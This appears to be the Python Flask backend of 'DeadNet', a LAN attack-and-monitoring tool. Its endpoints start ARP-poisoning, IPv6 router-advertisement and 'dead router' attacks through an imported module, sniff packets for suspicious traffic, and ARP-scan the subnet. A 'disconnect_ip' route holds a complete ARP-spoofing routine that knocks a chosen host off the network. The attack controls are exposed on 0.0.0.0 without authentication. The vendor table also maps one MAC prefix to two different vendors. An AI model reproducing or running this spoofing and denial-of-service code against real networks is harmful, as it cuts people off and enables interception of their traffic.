#!/usr/bin/env python3
"""
DeadNet - Network Security Testing & Defense Tool
Unified Backend Server with CLI options
"""

import argparse
import logging
import threading
import time
import os
import sys
import webbrowser
from datetime import datetime
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

# Determine if running as frozen exe
IS_FROZEN = getattr(sys, 'frozen', False)

if IS_FROZEN:
    # PyInstaller extracts to temp folder, use _MEIPASS for bundled files
    BASE_DIR = sys._MEIPASS
    # For log file, use exe directory
    EXE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    EXE_DIR = BASE_DIR

# Setup logging to file for frozen exe (no console)
LOG_FILE = os.path.join(EXE_DIR, 'deadnet.log')
if IS_FROZEN:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[logging.FileHandler(LOG_FILE, mode='w')]
    )
else:
    logging.basicConfig(level=logging.INFO)

logger = logging.getLogger('DeadNet')

# System tray support
try:
    import pystray
    from PIL import Image, ImageDraw
    HAS_TRAY = True
except ImportError:
    HAS_TRAY = False

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    import netifaces
    from scapy.all import *
    from backend.defines import *
    from backend.misc_utils import is_admin, os_is_windows
    from backend.network_utils import get_network_interfaces
    from backend.attacker import DeadNetAttacker
    from backend.detector import PacketDetector
    from backend.database import DefenderDatabase
except Exception as e:
    logger.error(f"Import error: {e}")
    if IS_FROZEN:
        # Show error dialog for frozen exe
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, f"Failed to load modules:\n{e}", "DeadNet Error", 0x10)
        except:
            pass
    sys.exit(1)

conf.verb = 0

DIST_DIR = os.path.join(BASE_DIR, 'dist')

app = Flask(__name__, static_folder=DIST_DIR, static_url_path='')
CORS(app)

# Attacker State
attack_state = {
    'active': False, 'mode': None, 'interface': None,
    'attacks_enabled': {'arp_poison': True, 'ipv6_ra': True, 'dead_router': True},
    'statistics': {'cycles': 0, 'packets_sent': 0, 'start_time': None, 'last_cycle_duration': 0},
    'network_info': {}, 'logs': []
}
attack_lock = threading.Lock()
current_attacker = None

# Defender State
monitor_state = {
    'active': False, 'interface': None, 'start_time': None,
    'statistics': {
        'total_packets': 0, 'suspicious_packets': 0, 'flagged_ips': 0,
        'flagged_macs': 0, 'arp_packets': 0, 'ipv6_packets': 0,
        'suspicious_arp': 0, 'suspicious_ipv6': 0
    },
    'recent_alerts': []
}
monitor_lock = threading.Lock()
sniffer = None
detector = None
db = DefenderDatabase()


# Static Files
@app.route('/')
def index():
    return send_from_directory(DIST_DIR, 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory(DIST_DIR, path)

# Attacker API
@app.route('/api/status', methods=['GET'])
def get_attack_status():
    with attack_lock:
        return jsonify({
            'active': attack_state['active'], 'mode': attack_state['mode'],
            'interface': attack_state['interface'],
            'attacks_enabled': attack_state['attacks_enabled'].copy(),
            'statistics': attack_state['statistics'].copy(),
            'network_info': attack_state['network_info'].copy()
        })

@app.route('/api/logs', methods=['GET'])
def get_attack_logs():
    limit = request.args.get('limit', 50, type=int)
    with attack_lock:
        return jsonify({'logs': attack_state['logs'][-limit:]})

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    return jsonify({'interfaces': get_network_interfaces()})

@app.route('/api/start', methods=['POST'])
def start_attack():
    global current_attacker
    data = request.json
    iface = data.get('interface')
    
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with attack_lock:
        if attack_state['active']:
            return jsonify({'success': False, 'error': 'Attack already running'}), 400
        attack_state['active'] = True
        attack_state['mode'] = data.get('mode', 'local')
        attack_state['interface'] = iface
        attack_state['statistics'] = {'cycles': 0, 'packets_sent': 0, 'start_time': None, 'last_cycle_duration': 0}
        attack_state['logs'] = []
    
    target_ips = None
    target_ips_str = data.get('target_ips') or ''
    if target_ips_str.strip():
        target_ips = [ip.strip() for ip in target_ips_str.split(',') if ip.strip()]
    
    def run_attack():
        global current_attacker
        try:
            current_attacker = DeadNetAttacker(
                iface=iface, cidrlen=data.get('cidrlen', 24),
                interval=data.get('interval', 5), gateway_ipv4=None, gateway_mac=None,
                disable_ipv6=not data.get('enable_ipv6', True), ipv6_preflen=64,
                mode=data.get('mode', 'local'), fake_ip=data.get('fake_ip'),
                target_ips=target_ips, attack_state=attack_state, attack_lock=attack_lock
            )
            with attack_lock:
                attack_state['network_info'] = {
                    'interface': current_attacker.network_interface,
                    'ip': current_attacker.user_ipv4,
                    'gateway': current_attacker.gateway_ipv4,
                    'gateway_mac': current_attacker.gateway_mac,
                    'subnet': current_attacker.subnet_ipv4_sr,
                    'target_hosts': len(current_attacker.host_ipv4s)
                }
            current_attacker.start_attack()
        except Exception as e:
            with attack_lock:
                attack_state['logs'].append({'timestamp': time.time(), 'message': f"[!] Error: {e}"})
        finally:
            with attack_lock:
                attack_state['active'] = False
    
    threading.Thread(target=run_attack, daemon=True).start()
    return jsonify({'success': True, 'message': 'Attack started'})

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    global current_attacker
    with attack_lock:
        if not attack_state['active']:
            return jsonify({'success': False, 'error': 'No attack running'}), 400
        attack_state['active'] = False
    if current_attacker:
        current_attacker.stop()
        current_attacker = None
    return jsonify({'success': True, 'message': 'Attack stopped'})


# Defender API
def add_alert(alert_type, severity, message, ip=None, mac=None, details=None):
    alert = {'timestamp': datetime.now().isoformat(), 'type': alert_type, 'severity': severity,
             'message': message, 'ip': ip, 'mac': mac, 'details': details or {}}
    with monitor_lock:
        monitor_state['recent_alerts'].insert(0, alert)
        if len(monitor_state['recent_alerts']) > 100:
            monitor_state['recent_alerts'] = monitor_state['recent_alerts'][:100]
    db.add_alert(alert)
    if ip:
        db.flag_ip(ip, alert_type, severity, message)
        with monitor_lock:
            monitor_state['statistics']['flagged_ips'] = db.get_flagged_count('ip')
    if mac:
        db.flag_mac(mac, alert_type, severity, message)
        with monitor_lock:
            monitor_state['statistics']['flagged_macs'] = db.get_flagged_count('mac')

def packet_callback(packet):
    global detector
    try:
        with monitor_lock:
            monitor_state['statistics']['total_packets'] += 1
        results = detector.analyze_packet(packet)
        if results['suspicious']:
            with monitor_lock:
                monitor_state['statistics']['suspicious_packets'] += 1
            for d in results['detections']:
                add_alert(d['type'], d['severity'], d['message'], d.get('ip'), d.get('mac'), d.get('details'))
                with monitor_lock:
                    if 'ARP' in d['type']:
                        monitor_state['statistics']['suspicious_arp'] += 1
                    elif 'IPv6' in d['type']:
                        monitor_state['statistics']['suspicious_ipv6'] += 1
        if packet.haslayer(ARP):
            with monitor_lock:
                monitor_state['statistics']['arp_packets'] += 1
        if packet.haslayer(IPv6):
            with monitor_lock:
                monitor_state['statistics']['ipv6_packets'] += 1
    except Exception as e:
        print(f"Packet error: {e}")

def start_monitoring(interface):
    global detector, sniffer
    detector = PacketDetector(interface)
    with monitor_lock:
        monitor_state['active'] = True
        monitor_state['interface'] = interface
        monitor_state['start_time'] = time.time()
    try:
        sniffer = AsyncSniffer(iface=interface, prn=packet_callback, store=False)
        sniffer.start()
        while monitor_state['active']:
            time.sleep(0.1)
        if sniffer:
            sniffer.stop()
    except Exception as e:
        print(f"Monitor error: {e}")
        with monitor_lock:
            monitor_state['active'] = False

@app.route('/api/defender/status', methods=['GET'])
def get_defender_status():
    with monitor_lock:
        return jsonify({
            'active': monitor_state['active'], 'interface': monitor_state['interface'],
            'start_time': monitor_state['start_time'],
            'statistics': monitor_state['statistics'].copy(),
            'uptime': int(time.time() - monitor_state['start_time']) if monitor_state['start_time'] else 0
        })

@app.route('/api/defender/alerts', methods=['GET'])
def get_defender_alerts():
    limit = request.args.get('limit', 50, type=int)
    with monitor_lock:
        return jsonify({'alerts': monitor_state['recent_alerts'][:limit]})

@app.route('/api/defender/flagged', methods=['GET'])
def get_flagged():
    return jsonify({'ips': db.get_flagged_ips(), 'macs': db.get_flagged_macs()})

@app.route('/api/defender/interfaces', methods=['GET'])
def get_defender_interfaces():
    return jsonify({'interfaces': get_network_interfaces()})

@app.route('/api/defender/start', methods=['POST'])
def start_defender():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    with monitor_lock:
        if monitor_state['active']:
            return jsonify({'success': False, 'error': 'Already monitoring'}), 400
        monitor_state['statistics'] = {
            'total_packets': 0, 'suspicious_packets': 0, 'flagged_ips': 0,
            'flagged_macs': 0, 'arp_packets': 0, 'ipv6_packets': 0,
            'suspicious_arp': 0, 'suspicious_ipv6': 0
        }
        monitor_state['recent_alerts'] = []
    threading.Thread(target=start_monitoring, args=(iface,), daemon=True).start()
    return jsonify({'success': True, 'message': 'Monitoring started'})

@app.route('/api/defender/stop', methods=['POST'])
def stop_defender():
    global sniffer
    with monitor_lock:
        if not monitor_state['active']:
            return jsonify({'success': False, 'error': 'Not monitoring'}), 400
        monitor_state['active'] = False
    if sniffer and sniffer.running:
        try:
            sniffer.stop()
        except:
            pass
    return jsonify({'success': True, 'message': 'Monitoring stopped'})

@app.route('/api/defender/unflag', methods=['POST'])
def unflag_address():
    data = request.json
    addr_type, address = data.get('type'), data.get('address')
    if not addr_type or not address:
        return jsonify({'success': False, 'error': 'Type and address required'}), 400
    if addr_type == 'ip':
        db.unflag_ip(address)
    elif addr_type == 'mac':
        db.unflag_mac(address)
    with monitor_lock:
        monitor_state['statistics']['flagged_ips'] = db.get_flagged_count('ip')
        monitor_state['statistics']['flagged_macs'] = db.get_flagged_count('mac')
    return jsonify({'success': True})

@app.route('/api/defender/clear_flags', methods=['POST'])
def clear_flags():
    db.clear_all_flags()
    with monitor_lock:
        monitor_state['statistics']['flagged_ips'] = 0
        monitor_state['statistics']['flagged_macs'] = 0
    return jsonify({'success': True})

@app.route('/api/minimize', methods=['POST'])
def minimize_window():
    """Minimize window to taskbar"""
    global webview_window
    if webview_window:
        try:
            webview_window.minimize()
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    return jsonify({'success': False, 'error': 'Not in WebView mode'})

# System tray state
tray_icon = None
is_hidden = False

def create_tray_image():
    """Create a simple icon for system tray"""
    size = 64
    image = Image.new('RGB', (size, size), color='black')
    draw = ImageDraw.Draw(image)
    # Draw a red skull-like shape
    draw.ellipse([8, 8, 56, 56], fill='#dc2626')
    draw.ellipse([16, 20, 28, 32], fill='black')  # left eye
    draw.ellipse([36, 20, 48, 32], fill='black')  # right eye
    draw.rectangle([28, 40, 36, 50], fill='black')  # nose
    return image

def show_window_from_tray(icon=None, item=None):
    """Show window from system tray"""
    global webview_window, is_hidden
    if webview_window:
        try:
            webview_window.show()
            webview_window.restore()
            is_hidden = False
        except:
            pass

def exit_from_tray(icon=None, item=None):
    """Exit app from tray"""
    global tray_icon
    if tray_icon:
        tray_icon.stop()
    os._exit(0)

def hide_to_tray():
    """Hide window to system tray"""
    global webview_window, tray_icon, is_hidden
    
    if not HAS_TRAY:
        return False
    
    if not webview_window:
        return False
    
    try:
        # Hide the window
        webview_window.hide()
        is_hidden = True
        
        # Create tray icon if not exists
        if not tray_icon:
            menu = pystray.Menu(
                pystray.MenuItem('Show DeadNet', show_window_from_tray, default=True),
                pystray.MenuItem('Exit', exit_from_tray)
            )
            tray_icon = pystray.Icon('DeadNet', create_tray_image(), 'DeadNet', menu)
            threading.Thread(target=tray_icon.run, daemon=True).start()
        
        return True
    except Exception as e:
        print(f"Tray error: {e}")
        return False

@app.route('/api/hide', methods=['POST'])
def hide_window():
    """Hide window to system tray"""
    if hide_to_tray():
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Cannot hide to tray'})

@app.route('/api/shutdown', methods=['POST'])
def shutdown_app():
    """Panic exit - stop everything and shutdown"""
    global current_attacker, sniffer
    
    # Stop attacker
    with attack_lock:
        attack_state['active'] = False
    if current_attacker:
        try:
            current_attacker.stop()
        except:
            pass
        current_attacker = None
    
    # Stop defender
    with monitor_lock:
        monitor_state['active'] = False
    if sniffer and sniffer.running:
        try:
            sniffer.stop()
        except:
            pass
    
    # Schedule shutdown
    def do_shutdown():
        time.sleep(0.5)
        os._exit(0)
    
    threading.Thread(target=do_shutdown, daemon=True).start()
    return jsonify({'success': True, 'message': 'Shutting down'})

# Scanner State
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import subprocess

scanner_state = {
    'scanning': False,
    'devices': [],
    'last_scan': None,
    'subnet': None,
    'progress': 0,
    'total': 0
}
scanner_lock = threading.Lock()

# Extended vendor database
MAC_VENDORS = {
    '00:50:56': 'VMware', '00:0c:29': 'VMware', '00:1c:42': 'Parallels',
    '08:00:27': 'VirtualBox', '52:54:00': 'QEMU/KVM',
    'b8:27:eb': 'Raspberry Pi', 'dc:a6:32': 'Raspberry Pi', 'e4:5f:01': 'Raspberry Pi',
    '00:1a:79': 'Apple', '00:03:93': 'Apple', 'f8:ff:c2': 'Apple',
    '3c:06:30': 'Apple', '00:17:f2': 'Apple', 'a4:83:e7': 'Apple',
    'ac:de:48': 'Apple', '00:1e:c2': 'Apple', '00:25:bc': 'Apple',
    '00:e0:4c': 'Realtek', '52:54:00': 'Realtek', '00:0e:c6': 'Realtek',
    '00:1b:21': 'Intel', '00:1e:67': 'Intel', '00:15:17': 'Intel',
    '00:1f:3b': 'Intel', '00:22:fa': 'Intel', '3c:97:0e': 'Intel',
    '00:50:f2': 'Microsoft', '00:0d:3a': 'Microsoft', '00:1d:d8': 'Microsoft',
    '00:12:5a': 'Microsoft', '00:15:5d': 'Microsoft', '28:18:78': 'Microsoft',
    '00:26:b9': 'Dell', '00:14:22': 'Dell', 'f8:db:88': 'Dell',
    '00:1e:68': 'HP', '00:21:5a': 'HP', '3c:d9:2b': 'HP', '00:1a:4b': 'HP',
    '00:1c:c0': 'Cisco', '00:1b:d4': 'Cisco', '00:26:0b': 'Cisco',
    '00:24:b2': 'Netgear', '00:1f:33': 'Netgear', '00:1e:2a': 'Netgear',
    '00:1d:7e': 'Linksys', '00:1a:70': 'Linksys', '00:14:bf': 'Linksys',
    '00:1e:58': 'D-Link', '00:22:b0': 'D-Link', '00:1c:f0': 'D-Link',
    '00:1f:1f': 'TP-Link', '50:c7:bf': 'TP-Link', 'c0:25:e9': 'TP-Link',
    '14:cc:20': 'TP-Link', 'ec:08:6b': 'TP-Link', '60:e3:27': 'TP-Link',
    '00:18:e7': 'Samsung', '00:21:19': 'Samsung', '00:26:37': 'Samsung',
    '5c:3c:27': 'Samsung', '84:25:db': 'Samsung', 'a8:06:00': 'Samsung',
    '00:1e:75': 'LG', '00:1c:62': 'LG', '10:68:3f': 'LG',
    '00:1a:8c': 'ASUS', '00:1f:c6': 'ASUS', '00:23:54': 'ASUS',
    '00:1f:d0': 'Xiaomi', '64:b4:73': 'Xiaomi', '78:11:dc': 'Xiaomi',
    '00:1a:11': 'Google', 'f4:f5:d8': 'Google', '94:eb:2c': 'Google',
    '00:bb:3a': 'Amazon', '74:c2:46': 'Amazon', 'a0:02:dc': 'Amazon',
    '00:fc:8b': 'Amazon', '44:65:0d': 'Amazon', 'fc:65:de': 'Amazon',
    '00:1a:2b': 'Huawei', '00:e0:fc': 'Huawei', '00:25:9e': 'Huawei',
    '48:46:fb': 'Huawei', '70:72:3c': 'Huawei', 'e4:68:a3': 'Huawei',
    '00:1e:10': 'OPPO', '00:08:22': 'OPPO', 'a4:77:33': 'OPPO',
    '00:27:15': 'Vivo', '00:09:df': 'Vivo', '98:6c:f5': 'Vivo',
    '00:1a:6d': 'Motorola', '00:04:0e': 'Motorola', '00:0c:e5': 'Motorola',
    '00:1e:4c': 'Sony', '00:13:a9': 'Sony', '00:1d:ba': 'Sony',
    '00:1b:77': 'Lenovo', '00:09:2d': 'Lenovo', '00:0b:82': 'Lenovo',
}

def get_mac_vendor(mac):
    """Get vendor from MAC address"""
    prefix = mac[:8].lower()
    return MAC_VENDORS.get(prefix, 'Unknown')

def get_arp_cache():
    """Get devices from system ARP cache (instant)"""
    devices = {}
    try:
        if os_is_windows():
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0]
                    mac = parts[1] if len(parts) > 1 else ''
                    if '.' in ip and ('-' in mac or ':' in mac):
                        mac = mac.replace('-', ':').upper()
                        if mac != 'FF:FF:FF:FF:FF:FF':
                            devices[ip] = mac
        else:
            result = subprocess.run(['arp', '-n'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3 and '.' in parts[0]:
                    ip, mac = parts[0], parts[2].upper()
                    if mac != 'FF:FF:FF:FF:FF:FF' and ':' in mac:
                        devices[ip] = mac
    except:
        pass
    return devices

def arp_ping_host(ip, interface, timeout=1):
    """Send ARP request to single host"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     iface=interface, timeout=timeout, verbose=0)
        if ans:
            return {'ip': ip, 'mac': ans[0][1].hwsrc.upper()}
    except:
        pass
    return None

def scan_network_fast(interface, timeout=2, max_workers=50):
    """Fast multi-threaded network scan"""
    devices = {}
    
    try:
        # Get interface info
        iface_info = None
        for iface in get_network_interfaces():
            if iface['name'] == interface:
                iface_info = iface
                break
        
        if not iface_info or not iface_info.get('ip'):
            return []
        
        my_ip = iface_info['ip']
        gateway = iface_info.get('gateway', '')
        base_ip = '.'.join(my_ip.split('.')[:3])
        subnet = f"{base_ip}.0/24"
        
        with scanner_lock:
            scanner_state['subnet'] = subnet
            scanner_state['progress'] = 0
            scanner_state['total'] = 254
        
        # Step 1: Get ARP cache first (instant results)
        arp_cache = get_arp_cache()
        for ip, mac in arp_cache.items():
            if ip.startswith(base_ip):
                devices[ip] = mac
        
        # Update progress with cache results
        with scanner_lock:
            scanner_state['devices'] = [
                {
                    'ip': ip, 'mac': mac, 'vendor': get_mac_vendor(mac),
                    'hostname': '', 'is_gateway': ip == gateway, 'is_self': ip == my_ip
                }
                for ip, mac in devices.items()
            ]
        
        # Step 2: Multi-threaded ARP scan for remaining hosts
        ips_to_scan = [f"{base_ip}.{i}" for i in range(1, 255) if f"{base_ip}.{i}" not in devices]
        
        scanned = 0
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(arp_ping_host, ip, interface, timeout): ip for ip in ips_to_scan}
            
            for future in as_completed(futures):
                scanned += 1
                with scanner_lock:
                    scanner_state['progress'] = len(devices) + scanned
                
                result = future.result()
                if result:
                    devices[result['ip']] = result['mac']
                    # Update devices list in real-time
                    with scanner_lock:
                        scanner_state['devices'] = [
                            {
                                'ip': ip, 'mac': mac, 'vendor': get_mac_vendor(mac),
                                'hostname': '', 'is_gateway': ip == gateway, 'is_self': ip == my_ip
                            }
                            for ip, mac in sorted(devices.items(), key=lambda x: [int(p) for p in x[0].split('.')])
                        ]
        
        # Step 3: Resolve hostnames in background (optional, non-blocking)
        def resolve_hostnames():
            for device in scanner_state['devices']:
                try:
                    hostname = socket.gethostbyaddr(device['ip'])[0]
                    device['hostname'] = hostname[:30]
                except:
                    pass
        
        threading.Thread(target=resolve_hostnames, daemon=True).start()
        
    except Exception as e:
        logger.error(f"Scan error: {e}")
    
    # Final sort
    final_devices = [
        {
            'ip': ip, 'mac': mac, 'vendor': get_mac_vendor(mac),
            'hostname': '', 'is_gateway': ip == gateway, 'is_self': ip == my_ip
        }
        for ip, mac in sorted(devices.items(), key=lambda x: [int(p) for p in x[0].split('.')])
    ]
    
    return final_devices

@app.route('/api/scanner/scan', methods=['POST'])
def start_scan():
    data = request.json
    interface = data.get('interface')
    timeout = data.get('timeout', 2)
    
    if not interface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with scanner_lock:
        if scanner_state['scanning']:
            return jsonify({'success': False, 'error': 'Scan already in progress'}), 400
        scanner_state['scanning'] = True
        scanner_state['devices'] = []
        scanner_state['progress'] = 0
    
    def do_scan():
        try:
            devices = scan_network_fast(interface, timeout)
            with scanner_lock:
                scanner_state['devices'] = devices
                scanner_state['last_scan'] = time.time()
        finally:
            with scanner_lock:
                scanner_state['scanning'] = False
                scanner_state['progress'] = scanner_state['total']
    
    threading.Thread(target=do_scan, daemon=True).start()
    return jsonify({'success': True, 'message': 'Scan started'})

@app.route('/api/scanner/status', methods=['GET'])
def get_scanner_status():
    with scanner_lock:
        return jsonify({
            'scanning': scanner_state['scanning'],
            'device_count': len(scanner_state['devices']),
            'last_scan': scanner_state['last_scan'],
            'subnet': scanner_state['subnet'],
            'progress': scanner_state.get('progress', 0),
            'total': scanner_state.get('total', 254)
        })

@app.route('/api/scanner/devices', methods=['GET'])
def get_scanner_devices():
    with scanner_lock:
        return jsonify({
            'devices': scanner_state['devices'],
            'last_scan': scanner_state['last_scan'],
            'subnet': scanner_state['subnet']
        })

@app.route('/api/defender/disconnect_ip', methods=['POST'])
def disconnect_ip():
    data = request.json
    ip_address = data.get('ip')
    if not ip_address:
        return jsonify({'success': False, 'error': 'IP required'}), 400
    with monitor_lock:
        if not monitor_state['active']:
            return jsonify({'success': False, 'error': 'Monitoring must be active'}), 400
        interface = monitor_state['interface']
    
    def kick():
        try:
            gw = netifaces.gateways().get('default', {}).get(netifaces.AF_INET, [None])[0]
            if not gw:
                return
            gw_mac = getmacbyip(gw)
            if not gw_mac:
                return
            for _ in range(10):
                fake = RandMAC()
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw, hwsrc=fake, pdst=ip_address), iface=interface, verbose=0)
                sendp(Ether(dst=gw_mac) / ARP(op=2, psrc=ip_address, hwsrc=fake, pdst=gw), iface=interface, verbose=0)
                time.sleep(0.1)
        except:
            pass
    
    threading.Thread(target=kick, daemon=True).start()
    return jsonify({'success': True, 'message': f'Counter-attack on {ip_address}'})


# Main Entry Point
def run_browser_mode(port, no_open):
    print(f"{GREEN}[+]{WHITE} Server: http://localhost:{port}")
    if not no_open:
        def open_browser():
            time.sleep(1.5)
            webbrowser.open(f'http://localhost:{port}')
        threading.Thread(target=open_browser, daemon=True).start()
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

webview_window = None

def run_webview_mode(port):
    global webview_window
    try:
        import webview
    except ImportError:
        print(f"{RED}[!]{WHITE} pywebview not installed. Falling back to browser...")
        run_browser_mode(port, False)
        return
    
    print(f"{GREEN}[+]{WHITE} Starting WebView...")
    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=port, debug=False, threaded=True), daemon=True).start()
    time.sleep(1.5)
    webview_window = webview.create_window('DeadNet', f'http://127.0.0.1:{port}', width=1100, height=700, resizable=True, min_size=(900, 600))
    webview.start()

def show_error(message):
    """Show error message - dialog for frozen, print for console"""
    logger.error(message)
    if IS_FROZEN:
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, "DeadNet Error", 0x10)
        except:
            pass
    else:
        print(f"{RED}[!]{WHITE} {message}")

def main():
    try:
        parser = argparse.ArgumentParser(description='DeadNet - Network Security Tool')
        parser.add_argument('--browser', '-b', action='store_true', help='Browser mode')
        parser.add_argument('--webview', '-w', action='store_true', help='WebView mode')
        parser.add_argument('--port', '-p', type=int, default=5000, help='Port (default: 5000)')
        parser.add_argument('--no-open', action='store_true', help='Don\'t auto-open browser')
        args = parser.parse_args()
        
        logger.info("DeadNet starting...")
        
        if not IS_FROZEN:
            print(f"\n{BANNER}")
            print("DeadNet - Network Security Testing & Defense Tool")
            print("=" * 60)
        
        if not is_admin():
            show_error("Administrator privileges required!\nPlease run as administrator.")
            sys.exit(1)
        
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        sys.modules['flask.cli'].show_server_banner = lambda *x: None
        
        if args.browser and args.webview:
            show_error("Cannot use both --browser and --webview")
            sys.exit(1)
        
        # Check dist folder exists
        if not os.path.exists(os.path.join(DIST_DIR, 'index.html')):
            show_error(f"Web assets not found in: {DIST_DIR}\nRun 'npm run build' first.")
            sys.exit(1)
        
        mode = 'browser' if args.browser else ('webview' if args.webview else ('webview' if os_is_windows() else 'browser'))
        logger.info(f"Mode: {mode.upper()} | Port: {args.port}")
        
        if not IS_FROZEN:
            print(f"{BLUE}[*]{WHITE} Mode: {mode.upper()} | Port: {args.port}")
            print("=" * 60 + "\n")
        
        if mode == 'webview':
            run_webview_mode(args.port)
        else:
            run_browser_mode(args.port, args.no_open)
            
    except Exception as e:
        logger.exception("Fatal error")
        show_error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
